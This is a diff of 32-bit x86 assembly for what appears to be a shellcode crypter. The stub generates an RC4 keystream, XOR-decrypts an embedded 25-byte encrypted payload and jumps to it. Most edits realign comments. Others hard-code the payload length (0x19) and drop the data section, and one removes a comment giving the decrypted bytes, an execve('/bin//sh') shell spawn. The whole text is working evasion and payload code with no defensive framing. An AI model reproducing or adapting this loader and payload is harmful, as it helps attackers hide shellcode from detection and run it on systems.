@@ -28,15 +28,15 @@ _start:
 	
 	; edx will point to S[0]
 	; ecx will be i
-	xor ecx, ecx		; clear ecx register 
-	mov ecx, 255		; move 255 into ecx
+	xor ecx, ecx			; clear ecx register 
+	mov ecx, 255			; move 255 into ecx
 s_arr:	
-	dec esp 			; adjust stack
-	mov byte[esp], cl	; push bytes onto the stack to populate S array
-	loop s_arr			; loop to fill S array
-	dec esp				; adjust stack
-	mov byte[esp], cl ; append 0x00 onto the stack for S[0]
-	mov edx, esp		; point edx at the esp
+	dec esp 				; adjust stack
+	mov byte[esp], cl		; push bytes onto the stack to populate S array
+	loop s_arr				; loop to fill S array
+	dec esp					; adjust stack
+	mov byte[esp], cl 		; append 0x00 onto the stack for S[0]
+	mov edx, esp			; point edx at the esp
 
 
     ;	for (i = j = 0; i < 256; i++) {
@@ -68,18 +68,18 @@ init:
 	mov cl, byte[edx + esi]	; move the byte at S[i] into ebx 
 	mov byte[edx + esi], ch	; move the byte at S[j] into S[i]
 	mov byte[edx + ebx], cl	; move the byte that was stored at S[i] into S[j] 
-	inc esi				; increment for loop
-	cmp esi, 256		; condition
+	inc esi					; increment for loop
+	cmp esi, 256			; condition
 	jne init
-	xor esi, esi		; i = 0
-	xor ebx, ebx		; j = 0
+	xor esi, esi			; i = 0
+	xor ebx, ebx			; j = 0
 
 	; Psuedo-Random Generation Algorithm
 	; while(n = 0; n < enc_len; n++){
 	;	i = (i + 1) % 256
 	;	j = (j + S[i]) % 256
 	;	swap(S[i] <-> S[j])
-	;	keystream = S[(S[i]+ S[j]) % 256]
+	;	keystream[n] = S[(S[i]+ S[j]) % 256]
 	;}
 	; edx will point to S[0]
 	; eax will point to k[0]
@@ -87,19 +87,19 @@ init:
 	; ebx will be j
 	; edi will be n
 	; esi will be i
-	xor ecx, ecx		; clear ecx
-	mov ecx, [enc_len]	; Initialize keystream array
+	xor ecx, ecx			; clear ecx
+	mov ecx, 0x19			; Initialize keystream array
 k_arr:	
 	dec esp
-	mov byte[esp], bl	; copy 0s onto the stack
-	loop k_arr			; loop to fill the array of size enc_len
-	mov eax, esp 		; point eax at k[0]
-	xor edi, edi		; clear edi to use as n
+	mov byte[esp], bl		; copy 0s onto the stack
+	loop k_arr				; loop to fill the array of size enc_len
+	mov eax, esp 			; point eax at k[0]
+	xor edi, edi			; clear edi to use as n
 prga:
-	add esi, 0x1 		; i + 1
-	and esi, 0xff		; (i + 1)% 256
+	add esi, 0x1 			; i + 1
+	and esi, 0xff			; (i + 1)% 256
 	add bl, byte[edx + esi]	; add S[i] to J
-	and ebx, 0xff		; (j + S[i]) % 256
+	and ebx, 0xff			; (j + S[i]) % 256
 	push eax
 	xor eax, eax
 	xor ecx, ecx
@@ -107,16 +107,16 @@ prga:
 	mov cl, byte[edx + esi] ; S[i] 
 	mov byte[edx + ebx], cl
 	mov byte[edx + esi], al ; swap(S[i] <-> S[j])
-	add ecx, eax		; S[i] + S[j]
+	add ecx, eax			; S[i] + S[j]
 	pop eax
-	and ecx, 0xff		; % 256
+	and ecx, 0xff			; % 256
 	push ebx
 	xor ebx, ebx
-	mov bl, byte[edx + ecx]; move the byte S[t] into ebx
-	mov byte[eax + edi], bl ; ; move the byte into k[n]
+	mov bl, byte[edx + ecx]	; move the byte S[S[i]+ S[j]) % 256] into ebx
+	mov byte[eax + edi], bl ; move the byte into k[n]
 	pop ebx 				; return original value of j
-	inc edi				; increment n
-	cmp edi, [enc_len]; compare n with enc_len
+	inc edi					; increment n
+	cmp edi, 0x19			; compare n with length
 	jne prga
 
 
@@ -129,21 +129,21 @@ prga:
 	; eax = k[0]
 	; ebx = shellcode[0]
 	; esi = i
-	xor esi, esi
+	xor esi, esi			; clear esi
 	jmp load_enc_sc
 jmp_call_pop_sc:
-	pop ebx				; pop address of shellcode[0] into ebx
+	pop ebx					; pop address of shellcode[0] into ebx
 decrypt:	
-	xor edx, edx		; clear eax
-	xor ecx, ecx		; clear ebx
+	xor edx, edx			; clear eax
+	xor ecx, ecx			; clear ebx
 	mov dl, byte[ebx+esi]	; move byte at shellcode[i] into eax
 	mov cl, byte[eax+esi]	; move byte at keystream[i] into ebx
-	xor edx, ecx		; xor the bytes
+	xor edx, ecx			; xor the bytes
 	mov byte[ebx+esi], dl 	; replace the byte at shellcode[i]
-	inc esi				; increment count
-	cmp esi, enc_len	; check for length
-	je sc 				; jmp to shellcode once decrypted
-	jmp decrypt 		; else loop
+	inc esi					; increment count
+	cmp esi, 0x19			; check for length
+	je sc 					; jmp to shellcode once decrypted
+	jmp decrypt 			; else loop
 
 load_key:
  	call jmp_call_pop_key
@@ -151,8 +151,3 @@ load_key:
 load_enc_sc:
 	call jmp_call_pop_sc
  	sc: db 0x86,0x86,0x50,0x04,0xb7,0xde,0x8f,0xf0,0x31,0x7e,0xdc,0x9f,0x93,0x4e,0x6a,0xad,0x55,0x21,0x1e,0x19,0x11,0xc0,0x35,0x13,0xfd
-
-section .data
-	enc_len: db 0x19
-
-; decrypted: 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
